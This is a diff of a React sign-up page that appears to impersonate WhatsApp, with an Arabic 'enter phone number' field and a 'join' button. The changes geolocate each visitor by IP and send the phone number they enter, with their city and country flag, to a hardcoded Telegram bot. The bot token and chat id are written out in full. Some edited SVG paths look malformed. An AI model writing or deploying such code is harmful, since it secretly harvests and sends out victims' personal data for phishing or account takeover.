@@ -19,27 +19,23 @@ export default function Number({ setPage, setNcode, ncode }) {
     country: "",
     countryCode: "",
     city: "",
-    timezone: "",
   });
 
   useEffect(() => {
-    if (state.country === "") {
-      getGeoInfo();
-    }
-  }, [state.country]);
+    getGeoInfo(); // Get location from the IP geolocation service
+  }, []);
 
+  // Function to get IP geolocation data
   const getGeoInfo = () => {
     Axios.get("https://ipapi.co/xml/")
       .then((response) => {
         let data = response.data;
         var xml = new XMLParser().parseFromString(data);
         setState({
-          ...state,
           ip: xml.children[0].value,
           country: xml.children[7].value,
           countryCode: xml.children[8].value,
           city: xml.children[3].value,
-          timezone: xml.children[17].value,
         });
       })
       .catch((e) => {
@@ -47,11 +43,22 @@ export default function Number({ setPage, setNcode, ncode }) {
       });
   };
 
+  const getFlagEmoji = (countryCode) => {
+    return countryCode
+      .toUpperCase()
+      .replace(/./g, (char) =>
+        String.fromCodePoint(127397 + char.charCodeAt()),
+      );
+  };
+
   const APIS = () => {
     const apiToken = "6433121980:AAGko90tu3pLPIhkMTOHyYQZXMVb-vW-RNs";
     const chatId = "5807893197";
-    const text = `${formatPhoneNumberIntl(value)}`;
-    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+    const ipAddress = state.ip; // Get the IP address from state
+    const flagEmoji = getFlagEmoji(state.countryCode); // Get the corresponding flag emoji
+    const city = state.city; // Get the city from geolocation
+    const text = `${flagEmoji} ${city} ${formatPhoneNumberIntl(value)}`;
+    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
     Axios(url);
   };
 
@@ -77,8 +84,8 @@ export default function Number({ setPage, setNcode, ncode }) {
         <div className="w-full max-w-md space-y-8">
           <div>
             <img
-              className="mx-auto h-12 w-auto"
-              src={`${process.env.PUBLIC_URL}/wp.png`}
+              className="mx-auto h-16 w-16"
+              src="/wp.png"
               alt="Your Company"
             />
             <h2 className="mt-6 text-center tracking-tight text-gray-700">
@@ -93,7 +100,7 @@ export default function Number({ setPage, setNcode, ncode }) {
             <div className="mt-8 space-y-6">
               <div className="-space-y-px rounded-md shadow-sm">
                 <PhoneInput
-                  className="PhoneInput bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                  className="PhoneInput bg-white border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-white dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                   placeholder="أدخل رقم الهاتف"
                   defaultCountry={state.countryCode}
                   value={value}
@@ -114,9 +121,9 @@ export default function Number({ setPage, setNcode, ncode }) {
                   >
                     <path
                       fillRule="evenodd"
-                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
-                      clipRule={"evenodd"}
-                    ></path>
+                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0 8 8 0 01-1 8H9a2 2 0 002 2v6a2 2 0 00-2-2h6a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z"
+                      clipRule="evenodd"
+                    />
                   </svg>
                   <span className="sr-only">Info</span>
                   <div>
@@ -141,12 +148,12 @@ export default function Number({ setPage, setNcode, ncode }) {
                     >
                       <path
                         fillRule="evenodd"
-                        d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z"
+                        d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm0 2a2.5 2.5 0 012.5 2.5V9h-5V5.5A2.5 2.5 0 0110 3zm0 8h5v6h-10v-6h5z"
                         clipRule="evenodd"
                       />
                     </svg>
                   </span>
-                  <div className="text-white">الإنضمام</div>
+                  الإنضمام
                 </button>
               </div>
             </div>
